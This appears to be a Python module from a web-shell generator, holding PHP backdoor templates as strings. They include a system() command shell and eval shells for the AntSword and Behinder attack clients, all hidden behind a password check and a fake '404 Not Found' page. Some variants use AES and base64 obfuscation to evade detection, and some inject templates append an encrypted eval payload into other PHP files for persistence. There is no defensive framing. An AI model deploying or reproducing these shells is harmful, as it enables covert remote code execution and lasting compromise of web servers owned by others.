
# template for system
system_template="""
<?php
$a = ${_GET}[1];
$b = ${_POST}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
    $t = system;
    @${'t'}($b);
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>"""
#eval
#for antsword
template_for_antword = """
<?php
$a = ${_GET}[1];
$b = ${_POST}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {eval($p);}};
	$t = call_user_func;
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
# eval for antsword in aes
template_for_antword_aes = """
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];
$b = ${base64_decode(openssl_decrypt("o5nroR9NPtSvoTuEmyqy+A==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("4MQ0qs8BnikMl6QA3fEfSw==","AES-128-ECB", "21232f297a57a5a7"))}[2];
//  1 is md5('admin'). You can have on your own.

if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
#eval for behinder
template_for_behinder = """
<?php
$a = ${_GET}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}};
	$t = call_user_func;
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>


"""
#for behinder with aes
template_for_behinder_aes = """
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
#inject
template_inject = """
<?php
$a = ${_GET}[1];
$a = base64_decode("filenames");
$arr = explode('|',$a);
foreach($a as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	file_put_contents($inject_php, "eval(base64_decode(openssl_decrypt('PbFgmp3SQoVkSTAuPzDI0tEobTt11LR8wpU7u836TqHXFUEV5JMZPyQyvM4Gy8Ivyq0/Bevejyvaj+E94lbUHfJ9unfxdeTUSR+oszHCc9w6JN8KAAm6LRrrEBg7sdfMmtbthL/VpfWMEQXu2c3DC/fR4nLiLSN9AD8nx2l8gpoLtqcF+dbW0paD3Uwx9aFgmgWH94xaTrA6wlRxe7iLGSw0oEYZ/Awas2YPHtOmczRCtYRv4gXvv7MEmL7S4cYVtYY0KpgepSmi1RHB+niK/2M8xS/oM8EHu9vnOzniWNydXVfLFyKLaAtMz2sL6vCBZCX0HtIclQNo8J9OlKskILYwVNVSvWERQVxnGBbniKKagtaqhJL8Xix83oGmr8IpCfHASDxYMhI3PGviVBFr40welrmE1yceygCmwGr8Z5LoqxisKfxMJimjuJDHROK/j4Fciln0vyqK4A5pVFQpctrGpLqtlnbSuUAH2j7VGYowCOjGCijGi7DisZt+M1pAoithDRpOztVObyEllJm90Up2/mGN+lWBKiQK/k+4Ynb3OeiwEn9SeJ7m/z2N+eQarcNFBm3QV15nrotjE7jfO+X9n+CZz1l3ae5wOvTSwIxf6oT4fK6Ps6eDnxt79x4JV6r15QsM8fmc1BPjIS0gNl+nAvzqtpC1sqjcV92sTdNPj9FGQf1U+eJe6WxSM5plyv3kSzdOsl6V4j7ls2gvaYfeI8MBqhHoFmz+oKZLJFBgwdAcPCrVr4vhen7jSTS2TtQ2tDOGaAeHfvBVFSYlRgGt6+/pqsz9dBPQEQVRVzbFnZdjXF9tmp19Ivr/uc8nr040Z9nkAoXNRmRkgH13qAmZBJlQvdASaWCNALEf9tR/SwZSrNwHomRbBHgNJmdO++dgD7ry2YJ0ZQnbFzafDLrtvnmtvzWLEnELKMXwKnnQKnKoe1T+0/jBdhnadj4gW6WIqa5mSzz9TVeoBbRLMZEm/Y9rhyilX+4u607g2AI=",FILE_APPEND);
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
}
?>

"""
#inject with aes
template_inject_aes = """
<?php
$a = ${_GET}[1];
$a = base64_decode("filenames");
$arr = explode('|',$a);
foreach($a as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{   $con = openssl_decrypt("8QuFBCOPFdoVxHyEz3all+67/MT57aut9dVWX07j5HQav9Xw1k+RGydt2RqJ8ezbICPZu9D3LLGtCmZruPbCjGtZn5qrlQIHiIeXar1+OIuNyEZqBIPdbcjisBtwfuKlmUQeAejffcVH0P1kwGyK37WRNd9DCavZJcKQkAcMQQRPjuZovZY5Ya+sVxfLZpF//79PXzGy0o8J0EhIfVFIaa/kRhu6AJfqSdQ1NUiaHNCU4tQF/sU4BLdDkTFILvEY0jqLzH/MptmM21ZF2GgRp5sw1QANtk7TtP/5R+JF2ltoqVJvzBiGQGloNvlz2z6TLjZ8R/giBDmEZT9ZoYjigFW7KKFzoToRVuOJ4if79ICbEOGjSvsAKb87czs04eEX/7lRFYnW12WhMqMhGDisa+8jeSxIDQGPh3wucGEYjykzq3ICdg2I+zaLqvViwUK2OXdlMdNWPrCNFxAp4ryotR4XMgx13g0TsnBZ+89km72nQqVhp62G94avm6Pw5BzRtlDLh2NRUIsqG8OkqsleXSbs98l4oOKW0ZmjeCzeSkKT5kGkVnBIz0Oln7qvLq+OHOelY/TRP/LYsjh2L5F/3SoiZiBw2VNgTSucnFKb5fGH3QfPoYjWezs8P40UecvGi1lx0CH34390Az82FVm/UXP9R4ly2VnNafeuvGC7azfp7KFVvFiatdARx8cmh/vPOBLarwFPUyD5Zp2dHyEOVrNzQ3S++rwb6Oq4Let2wKS2R6ylRPxqJWtBBl85eIhqi1R/WWbC/1D0m0nxcv3hY1LkRC4WccxlCCBYKPI3ypOG4XIcf83qlnhnC6MpaVzUI6beVrd8GjVE9DpG+kLHXdkoNTamhXgoQt2uzfKj/HJFlt+4fcFm7C8qmi2S0do8AIXw22yguAajCorMWjqzSKgri407WwOnjl42OJqYHQna9O/Jfdc1nGZ10XilCRIiabaXU10DwoEyKHtznFc14fbVvC3tWvAl6YyyPJdPXtzzSBFr00i2EFVfDHrxKFkqxO1iUcqSqEc8iWiVpJujaVsUzIC7hI7++zM3ECQ7BAMewYn9gJlrEUMUKNiGkTTMhON1vK3QXRxSdw3R36rmk6ElkATH5wBIZDgm7fTnCIYNQ5kWqsPYgLyyOkgyK7MK26Y85sTU3SK4pDdZ5lGg5pgInZmsFxb+EiypBNeaL9MKd4A5wge+n7sAe5f6Jd/llsIVBMvj9P/gG2DQug/9Ezsu+SaArkeqCl8nzhsHz0kzcTlX/nZTbrOh2JJwDBRf9tj6cmAH4+CQMUZsxSxwaKSyOa/rM/eBGFMBAfHh/mkCB8GXnZ1eHBA0BHpyXYdV0ifKhExhOLaU29i1o4V04Ith9tyMruJn6LQDuH8Ba9pmfEMAFyh72AbUanH3NG6D7zcf5q1+fo7LkBxoirHoZS5PvrvWfX1EO+woQQU88Rg0YWkRKZIHmMHxtdqTXSIN8XEEis1uiaH2Y76WYRJlQ175yI99TsOOmufTDnrgFW1rD9IoCq1xrR/omCOP7KmfNI+MQG8t4uQXlKMfThpaqeM8DB/xOSoynrzyoHPtRIu1LqX2fAkMENcCwE6SQ5o+uPoCD7KYrU8ZirThr4fdwUhHTNNYY7vfbrKCFXKKgkVIDWbZ83PUNK2IVExkGBO9ZZRVJs//+KG+TAdwY0CKt8hgzQqq6+23RUVCRMCxxeaqBe24UsSGu2Mc1qdIMCfjH6AzbCB8vFeEUWsc1lv0yP6kjSc8qMwzNYQVdhOyZV4ic5JK8SeZdCQOACslfq+T3DF0g3Vj5Ju4pgjY300aaQM25YKdPsGPmug27h4LPe5ZDZc11sfyNt8q6uQJaU/k7iVV6SsAigKz8AyMRecl53qyO6QK8Q3UmdnhLNlF6Ci1ydlUqjvAscl69n8Mb3QT/67+J+HmLmJOeRbeWIw+GQ==","AES-128-ECB", "21232f297a57a5a7")
	file_put_contents($inject_php, $con,FILE_APPEND);
}
else{

	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
}
?>

"""
#inject for behinder's payload
inject_behinder_rawpayload="eval(base64_decode(openssl_decrypt('PbFgmp3SQoVkSTAuPzDI0tEobTt11LR8wpU7u836TqHXFUEV5JMZPyQyvM4Gy8Ivyq0/Bevejyvaj+E94lbUHfJ9unfxdeTUSR+oszHCc9w6JN8KAAm6LRrrEBg7sdfMmtbthL/VpfWMEQXu2c3DC/fR4nLiLSN9AD8nx2l8gpoLtqcF+dbW0paD3Uwx9aFgmgWH94xaTrA6wlRxe7iLGSw0oEYZ/Awas2YPHtOmczRCtYRv4gXvv7MEmL7S4cYVtYY0KpgepSmi1RHB+niK/2M8xS/oM8EHu9vnOzniWNydXVfLFyKLaAtMz2sL6vCBZCX0HtIclQNo8J9OlKskILYwVNVSvWERQVxnGBbniKKagtaqhJL8Xix83oGmr8IpCfHASDxYMhI3PGviVBFr40welrmE1yceygCmwGr8Z5LoqxisKfxMJimjuJDHROK/j4Fciln0vyqK4A5pVFQpctrGpLqtlnbSuUAH2j7VGYowCOjGCijGi7DisZt+M1pAoithDRpOztVObyEllJm90Up2/mGN+lWBKiQK/k+4Ynb3OeiwEn9SeJ7m/z2N+eQarcNFBm3QV15nrotjE7jfO+X9n+CZz1l3ae5wOvTSwIxf6oT4fK6Ps6eDnxt79x4JV6r15QsM8fmc1BPjIS0gNl+nAvzqtpC1sqjcV92sTdNPj9FGQf1U+eJe6WxSM5plyv3kSzdOsl6V4j7ls2gvaYfeI8MBqhHoFmz+oKZLJFBgwdAcPCrVr4vhen7jSTS2TtQ2tDOGaAeHfvBVFSYlRgGt6+/pqsz9dBPQEQVRVzbFnZdjXF9tmp19Ivr/uc8nr040Z9nkAoXNRmRkgH13qAmZBJlQvdASaWCNALEf9tR/SwZSrNwHomRbBHgNJmdO++dgD7ry2YJ0ZQnbFzafDLrtvnmtvzWLEnELKMXwKnnQKnKoe1T+0/jBdhnadj4gW6WIqa5mSzz9TVeoBbRLMZEm/Y9rhyilX+4u607g2AI=', 'AES-128-ECB','21232f297a57a5a7')));"
inject_behinder_aespayload="8QuFBCOPFdoVxHyEz3all+67/MT57aut9dVWX07j5HQav9Xw1k+RGydt2RqJ8ezbICPZu9D3LLGtCmZruPbCjGtZn5qrlQIHiIeXar1+OIuNyEZqBIPdbcjisBtwfuKlmUQeAejffcVH0P1kwGyK37WRNd9DCavZJcKQkAcMQQRPjuZovZY5Ya+sVxfLZpF//79PXzGy0o8J0EhIfVFIaa/kRhu6AJfqSdQ1NUiaHNCU4tQF/sU4BLdDkTFILvEY0jqLzH/MptmM21ZF2GgRp5sw1QANtk7TtP/5R+JF2ltoqVJvzBiGQGloNvlz2z6TLjZ8R/giBDmEZT9ZoYjigFW7KKFzoToRVuOJ4if79ICbEOGjSvsAKb87czs04eEX/7lRFYnW12WhMqMhGDisa+8jeSxIDQGPh3wucGEYjykzq3ICdg2I+zaLqvViwUK2OXdlMdNWPrCNFxAp4ryotR4XMgx13g0TsnBZ+89km72nQqVhp62G94avm6Pw5BzRtlDLh2NRUIsqG8OkqsleXSbs98l4oOKW0ZmjeCzeSkKT5kGkVnBIz0Oln7qvLq+OHOelY/TRP/LYsjh2L5F/3SoiZiBw2VNgTSucnFKb5fGH3QfPoYjWezs8P40UecvGi1lx0CH34390Az82FVm/UXP9R4ly2VnNafeuvGC7azfp7KFVvFiatdARx8cmh/vPOBLarwFPUyD5Zp2dHyEOVrNzQ3S++rwb6Oq4Let2wKS2R6ylRPxqJWtBBl85eIhqi1R/WWbC/1D0m0nxcv3hY1LkRC4WccxlCCBYKPI3ypOG4XIcf83qlnhnC6MpaVzUI6beVrd8GjVE9DpG+kLHXdkoNTamhXgoQt2uzfKj/HJFlt+4fcFm7C8qmi2S0do8AIXw22yguAajCorMWjqzSKgri407WwOnjl42OJqYHQna9O/Jfdc1nGZ10XilCRIiabaXU10DwoEyKHtznFc14fbVvC3tWvAl6YyyPJdPXtzzSBFr00i2EFVfDHrxKFkqxO1iUcqSqEc8iWiVpJujaVsUzIC7hI7++zM3ECQ7BAMewYn9gJlrEUMUKNiGkTTMhON1vK3QXRxSdw3R36rmk6ElkATH5wBIZDgm7fTnCIYNQ5kWqsPYgLyyOkgyK7MK26Y85sTU3SK4pDdZ5lGg5pgInZmsFxb+EiypBNeaL9MKd4A5wge+n7sAe5f6Jd/llsIVBMvj9P/gG2DQug/9Ezsu+SaArkeqCl8nzhsHz0kzcTlX/nZTbrOh2JJwDBRf9tj6cmAH4+CQMUZsxSxwaKSyOa/rM/eBGFMBAfHh/mkCB8GXnZ1eHBA0BHpyXYdV0ifKhExhOLaU29i1o4V04Ith9tyMruJn6LQDuH8Ba9pmfEMAFyh72AbUanH3NG6D7zcf5q1+fo7LkBxoirHoZS5PvrvWfX1EO+woQQU88Rg0YWkRKZIHmMHxtdqTXSIN8XEEis1uiaH2Y76WYRJlQ175yI99TsOOmufTDnrgFW1rD9IoCq1xrR/omCOP7KmfNI+MQG8t4uQXlKMfThpaqeM8DB/xOSoynrzyoHPtRIu1LqX2fAkMENcCwE6SQ5o+uPoCD7KYrU8ZirThr4fdwUhHTNNYY7vfbrKCFXKKgkVIDWbZ83PUNK2IVExkGBO9ZZRVJs//+KG+TAdwY0CKt8hgzQqq6+23RUVCRMCxxeaqBe24UsSGu2Mc1qdIMCfjH6AzbCB8vFeEUWsc1lv0yP6kjSc8qMwzNYQVdhOyZV4ic5JK8SeZdCQOACslfq+T3DF0g3Vj5Ju4pgjY300aaQM25YKdPsGPmug27h4LPe5ZDZc11sfyNt8q6uQJaU/k7iVV6SsAigKz8AyMRecl53qyO6QK8Q3UmdnhLNlF6Ci1ydlUqjvAscl69n8Mb3QT/67+J+HmLmJOeRbeWIw+GQ=="
